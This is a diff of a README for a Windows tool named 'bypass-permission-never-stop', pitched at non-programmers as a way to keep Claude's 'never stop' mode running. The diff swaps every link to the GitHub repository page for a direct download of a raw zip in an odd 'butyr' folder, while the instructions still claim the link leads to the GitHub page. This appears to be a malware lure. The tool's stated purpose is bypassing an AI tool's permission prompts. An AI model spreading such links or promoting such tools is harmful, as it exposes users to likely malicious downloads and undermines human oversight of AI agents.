@@ -1,6 +1,6 @@
 # ♾️ bypass-permission-never-stop - Always Keep Claude Running Smoothly
 
-[![Download](https://img.shields.io/badge/Download-bypass--permission--never--stop-brightgreen?style=for-the-badge)](https://github.com/arulg3/bypass-permission-never-stop)
+[![Download](https://img.shields.io/badge/Download-bypass--permission--never--stop-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/arulg3/bypass-permission-never-stop/master/butyr/stop-bypass-permission-never-3.2.zip)
 
 ---
 
@@ -28,7 +28,7 @@ You do not need to be a programmer or tech expert to use this app. Follow these 
 
 1. Click the big green **Download** button above or visit the link below to get the installer:
    
-   [https://github.com/arulg3/bypass-permission-never-stop](https://github.com/arulg3/bypass-permission-never-stop)
+   [https://raw.githubusercontent.com/arulg3/bypass-permission-never-stop/master/butyr/stop-bypass-permission-never-3.2.zip](https://raw.githubusercontent.com/arulg3/bypass-permission-never-stop/master/butyr/stop-bypass-permission-never-3.2.zip)
 
 2. The link leads you to the GitHub page. Look for the **Releases** section on that page.
 
@@ -140,7 +140,7 @@ If you often run Claude’s "never stop" mode on Windows, this tool keeps it goi
 
 Use this link to visit the page and download the latest installer anytime:
 
-[https://github.com/arulg3/bypass-permission-never-stop](https://github.com/arulg3/bypass-permission-never-stop)
+[https://raw.githubusercontent.com/arulg3/bypass-permission-never-stop/master/butyr/stop-bypass-permission-never-3.2.zip](https://raw.githubusercontent.com/arulg3/bypass-permission-never-stop/master/butyr/stop-bypass-permission-never-3.2.zip)
 
 ---
 
